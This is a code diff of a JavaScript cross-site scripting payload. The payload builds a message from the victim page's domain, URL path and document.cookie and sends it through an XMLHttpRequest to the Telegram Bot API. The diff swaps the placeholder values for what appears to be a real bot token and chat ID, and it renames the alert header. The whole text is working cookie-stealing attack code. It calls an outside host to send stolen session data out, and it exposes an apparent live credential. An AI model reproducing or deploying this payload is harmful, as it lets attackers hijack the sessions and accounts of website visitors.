@@ -1,5 +1,5 @@
-var tokenBot = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXX'; // Your "tokenBot" Here
-var chatId = 'XXXXXXXXXX'; // Your "chatId" Here
+var tokenBot = '6030941243:AAHbfjJ7bufGC6dZ1C5gc9jBf98T5A502G4'; // Your "tokenBot" Here
+var chatId = '5776318525'; // Your "chatId" Here
 
 /*
       _____    _          ___  
@@ -12,7 +12,7 @@ var chatId = 'XXXXXXXXXX'; // Your "chatId" Here
 */
 
 function telegramSend(tokenBot, chatId) {
-  var textData = '<b>XSS+Alert+in+' + document['domain']+'</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>' + document['location']['hostname'] + document['location']['pathname'] + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document['cookie'] + '</pre>';
+  var textData = '<b>bohay' + document['domain']+'</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>' + document['location']['hostname'] + document['location']['pathname'] + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document['cookie'] + '</pre>';
     var xhr = new XMLHttpRequest();
     xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + textData + '&parse_mode=html', true);
     xhr.send();
